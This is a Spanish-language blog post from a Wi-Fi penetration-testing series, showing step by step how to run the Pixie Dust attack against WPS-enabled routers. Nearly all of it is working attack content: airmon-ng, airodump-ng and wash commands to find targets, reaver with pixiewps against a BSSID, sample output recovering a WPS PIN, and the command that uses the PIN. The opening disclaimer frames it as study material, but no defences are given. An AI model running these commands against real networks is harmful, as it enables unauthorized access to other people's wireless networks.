---
layout: post
title: "Wi-Fi Pentesting - Pixi Dust Attack against WPA with wps"
date: 2020-06-17 20:00:00 -0400
comments: true
categories: [security]
sitemap:
  lastmod: 2020-06-11
  priority: 0.7
  changefreq: 'monthly'
  exclude: 'yes'
---

En esta serie de post se abordan comandos usados en pruebas de penetración de redes Wi-Fi, esta publicación consiste en una recopilación de instrucciones para su estudio, y posibles soluciones a estas vulnerabilidades, de ninguna forma se pretende fomentar el uso indebido de estas técnicas.


Reaver
===

Reaver implementa un ataque de fuerza bruta contra Redes WIFI protegidas por WPS.

Colocamos la interfaz en modo monitor
```
airmon-ng start wlx9cefd5feecd8
```

Eso modifica la interfaz a wlan0mon, ahora escuchamos los AP disponibles
```
airodump-ng wlan0mon
```

además podemos usar el siguiente comando para ver cuales tienen wps habilitado.
```
sudo wash -i wlan0mon
```


```
sudo reaver -i wlan0mon -b 00:1C:DF:XX:XX:XX -vvv -K 1
```
de lo anterior los parametros indican
-i  Indicates interface
-b BSSID of the target AP
-v verbose ( arroja mayor detalle den el resultado )
-K Run pixiewps

vamos a ver algo parecido a esto
```
Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 00:1C:DF:XX:XX:XX
[+] Received beacon from 00:1C:DF:XX:XX:XX
[+] Vendor: RalinkTe
[!] Found packet with bad FCS, skipping...
[+] Associated with 00:1C:DF:XX:XX:XX (ESSID: ROUTERNAME )
[+] Associated with 00:1C:DF:XX:XX:XX (ESSID: ROUTERNAME )
[+] Associated with 00:1C:DF:XX:XX:XX (ESSID: ROUTERNAME )
executing pixiewps -e 6a1f2b7ffc26202481db0895e835594fcacb3a169ece821315218d9a706be6eabf135f8b7f2d1e52cb99f448676bc
ea3c282878e80d4d75c9bf0bb5eff81952839ec0049bfc3d1de4afef7711e8415dff1541031995e862e1329e26fd8b43ef69ba92227a0dc4b09
6693f43775d7c881e812102ee69fe3051f8bdfea8af653b0ff1c440fd7ff9bdf4afc48ed5d847f5c57e5ae16 -s 3d7de714bc47115baa5a541
 b426d194e627eb5f00e83d94e9036bc653fb0678a1a4e9e6684c70e31ac9c78c -a 13ace7cc64d0c095181f4b1ca3eda63bdf26aab43b132d
008d9c2835 -r 00d21b0131770b4a24852a54addd06690dcdff6c29fc2470e2d5d6c66e0b55b319e870d7632ce7999156acd895a4d97a5293d
796a02e483cb2e44644be99dc15a64a8f2bf8af4cbd4c568565aa78527418df506249edfef3d0ac8aa89b84b7f5b27f7fcb68281fe97625916d
7cfec98f88e2e22c24a5d739746264d5aefc38586166fbd80e3be768359b150b654b413255fb3117

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x98bb0b87
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     7b77b3a22257c680b1fa6ddb2634594d
 [*] PSK2:     fb4b457ea2fcda13a0cc999aa1c4a008
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  35160007

 [*] Time taken: 0 s 16 ms

```

Si se consigue el pin entonces hacemos   
```
reaver -i wlan0mon -b 00:1C:DF:XX:XX:XX -c 6 -S y -vvv -p 35160007
```